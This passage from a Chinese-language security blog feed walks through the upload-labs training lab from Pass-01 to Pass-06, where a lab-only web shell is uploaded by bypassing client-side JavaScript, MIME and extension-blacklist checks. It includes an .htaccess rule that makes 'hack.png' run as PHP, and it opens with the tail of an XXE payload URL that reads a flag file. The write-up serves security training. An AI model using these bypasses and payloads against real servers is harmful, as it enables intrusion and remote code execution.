class="line">http://localhost/CTF/index.php?name=SimpleXMLElement&amp;param=&lt;?xml version=<span class="string">"1.0"</span>?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=/var/www/html/CTF/f1agi3hEre.php"</span>&gt;]&gt;&lt;x&gt;%26xxe;&lt;/x&gt;&amp;param2=2</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;红日安全-代码审计Day1-in-array函数缺陷&quot;&gt;&lt;a href=&quot;#红日安全-代码审计Day1-in-array函数缺陷&quot; class=&quot;headerlink&quot; title=&quot;[红日安全]代码审计Day1 - in_array函数缺陷&quot;&gt;&lt;/a&gt;[红日安全
      
    
    </summary>
    
    
      <category term="PHP" scheme="https://singlemindedt.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码审计实例</title>
    <link href="https://singlemindedt.github.io/2020/04/29/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%9E%E4%BE%8B/"/>
    <id>https://singlemindedt.github.io/2020/04/29/PHP代码审计实例/</id>
    <published>2020-04-29T06:42:31.000Z</published>
    <updated>2020-05-07T02:12:58.636Z</updated>
    
    <content type="html"><![CDATA[<h1 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h1><p><img src="https://s1.ax1x.com/2020/05/02/JvJadS.png" alt="JvJadS.png"></p><p><img src="https://s1.ax1x.com/2020/05/02/JvJYsP.png" alt="JvJYsP.png"></p><p>+++</p><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p><img src="https://s1.ax1x.com/2020/05/02/JvJJMt.png" alt="JvJJMt.png"></p><p>如图，要求我们上传一个webshell到服务器，并要求我们上传图片；</p><p>首先，我们上传任意文件试试：</p><p><img src="https://s1.ax1x.com/2020/05/02/JvJ8xI.png" alt="JvJ8xI.png"></p><p>提示我们，<strong>只能上传.jpg|.png|.gif类型的文件</strong>；</p><p>查看提示，“本pass在客户端使用js对不合法图片进行检查！”；</p><p>提示已经很明确了，该题目在客户端使用js过滤不合法后缀，我们只需要在上传时将文件改为合法后缀格式，然后抓包，再改包；</p><p>看看源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">checkFile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = document.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="keyword">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">        alert(<span class="string">"请选择要上传的文件!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">"|"</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>拦截方式：<strong>客户端js白名单检查</strong>;根据上传文件的后缀是否为.jpg|.png|.gif格式来判断文件能否上传；</li><li>绕过方式：将木马伪装成.jpg|.png|.gif文件，上传后burp拦截数据包，更改文件后缀为.php，再forward.</li></ul><p><img src="https://s1.ax1x.com/2020/05/02/JvJdIg.png" alt="JvJdIg.png"></p><p>改包：</p><p><img src="https://s1.ax1x.com/2020/05/02/JvJtqf.png" alt="JvJtqf.png"></p><h3 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h3><ol><li><p>修改js脚本</p></li><li><p>浏览器禁止使用js脚本（火狐下🦊)</p><ul><li>在Firefox地址栏里输入“about:config”。在搜索栏输入“javascript.enabled”查找到首选项。点击鼠标右键选择“切换”，把“javascript.enabled”键值改为“false”</li></ul></li></ol><p>+++</p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>首先，尝试上传php文件，提示信息为：<strong>文件类型不正确，请重新上传！</strong>这次给的不是白名单或者黑名单，而是告诉我们文件类型不正确，应该为MIME的检查。</p><p>查看提示：</p><blockquote><p>提示：本pass在服务端对数据包的MIME进行检查！</p></blockquote><p><strong>补充：</strong><br>MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">常见的MIME类型(通用型)：</span><br><span class="line">超文本标记语言文本 .html text/html</span><br><span class="line">xml文档 .xml text/xml</span><br><span class="line">XHTML文档 .xhtml application/xhtml+xml</span><br><span class="line">普通文本 .txt text/plain</span><br><span class="line">RTF文本 .rtf application/rtf</span><br><span class="line">PDF文档 .pdf application/pdf</span><br><span class="line">Microsoft Word文件 .word application/msword</span><br><span class="line">PNG图像 .png image/png</span><br><span class="line">GIF图形 .gif image/gif</span><br><span class="line">JPEG图形 .jpeg,.jpg image/jpeg</span><br><span class="line">au声音文件 .au audio/basic</span><br><span class="line">MIDI音乐文件 mid,.midi audio/midi,audio/x-midi</span><br><span class="line">RealAudio音乐文件 .ra, .ram audio/x-pn-realaudio</span><br><span class="line">MPEG文件 .mpg,.mpeg video/mpeg</span><br><span class="line">AVI文件 .avi video/x-msvideo</span><br><span class="line">GZIP文件 .gz application/x-gzip</span><br><span class="line">TAR文件 .tar application/x-tar</span><br><span class="line">任意的二进制数据 application/octet-stream</span><br></pre></td></tr></table></figure><p>+++</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>拦截方式：<strong>服务端白名单</strong>;对文件的MIME(Multipurpose Internet Mail Extensions)进行了验证，只允许图片类文件上传通过</p></li><li><p>绕过方式：</p><ol><li><p>直接上传含木马的图片文件，burp截包，修改后缀为php文件</p></li><li><p>直接上传木马文件，burp抓包，修改Content-Type为image/png等允许类型</p></li></ol></li></ul><p>+++</p><p>  此处我们利用2修改Content-Type为image/png：<br>抓包：<br>[4]:()</p><p><img src="https://s1.ax1x.com/2020/05/02/JvJUZ8.png" alt="JvJUZ8.png"></p><p>改包：<br>[5]:()</p><p><img src="https://s1.ax1x.com/2020/05/02/JvRDfA.png" alt="JvRDfA.png"></p><p>发包：<br>文件上传成功，直接将文件拖出来即可得访问；</p><p><img src="https://s1.ax1x.com/2020/05/02/JvWp11.png" alt="JvWp11.png"></p><p>+++</p><h2 id="Psaa-03"><a href="#Psaa-03" class="headerlink" title="Psaa-03"></a>Psaa-03</h2><p>首先，尝试上传php文件，提示信息为：<strong>提示：不允许上传.asp,.aspx,.php,.jsp后缀文件！</strong></p><p>查看提示：</p><blockquote><p>本pass禁止上传.asp|.aspx|.php|.jsp后缀文件！</p></blockquote><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>+++</p><ul><li><p>拦截方式：<strong>服务端黑名单验证</strong>;(禁止上传.asp|.aspx|.php|.jsp后缀文件)</p></li><li><p>绕过方式：<br>(1)可上传.php3.phtml .phps .php5 .pht…等这样可以被服务器解析的后缀名<br>(2)重写文件解析规则绕过，先上传一个.htaccess文件，再上传一个hack.png文件(含木马)<br>通过.htaccess文件调用php解析器去解析一个文件名中只要包含”hack.png”这个字符串的任意文件，无论扩展名是什么(没有也行)，都以php的方式来解析<br>.htaccess文件内容：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch "hack.png"&gt;</span></span><br><span class="line"><span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>此处修改文件后缀为.php3;<br>[8]:()</p><p><img src="https://s1.ax1x.com/2020/05/02/JvR66P.png" alt="JvR66P.png"></p><p>上传成功！<br>+++</p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>首先，尝试上传php文件，提示信息为：<strong>提示：此文件不允许上传!</strong> </p><p>查看提示：</p><blockquote><p>本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件！</p></blockquote><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>+++</p><ul><li><p>拦截方式：<strong>服务端黑名单加强验证</strong>;与Pass-03类似，只是对上传文件的后缀名的限制种类增加</p></li><li><p>绕过方式：重写文件解析规则绕过(第3关(2))</p><ol><li>上传<code>.htaccess文件</code></li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch "hack.png"&gt;</span></span><br><span class="line"><span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>上传hack.png（含木马）</li></ol></li></ul><p><img src="https://s1.ax1x.com/2020/05/02/JvRBYd.png" alt="JvRBYd.png"></p><p>上传成功，并以php进行了解析！</p><p>+++</p><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>首先，尝试上传php文件，提示信息为：*<em>提示：此文件类型不允许上传！            *</em></p><p>查看提示：</p><blockquote><p>本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess后缀文件！</p></blockquote><p>Pass-05向黑名单中增加了<code>.htaccess</code>后缀文件;</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>删除了该语句：<code>$file_ext = strtolower($file_ext); //转换为小写</code></p><p>+++</p><ul><li>拦截方式：<strong>服务端黑名单超级加强</strong>;.htaccess加入了黑名单，取消了后缀名全变为小写字母的strtolower（）函数</li><li>绕过方式：采用大小写混合方式绕过.PhP,.PHp5，或着.hTacCesS文件…</li></ul><p><img src="https://s1.ax1x.com/2020/05/02/JvR0FH.png" alt="JvR0FH.png"></p><p>上传成功！</p><p>+++</p><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p>首先，尝试上传php文件，提示信息为：*<em>提示：此文件不允许上传 *</em></p><p>查看提示：</p><blockquote><p>本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件！</p></blockquote><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        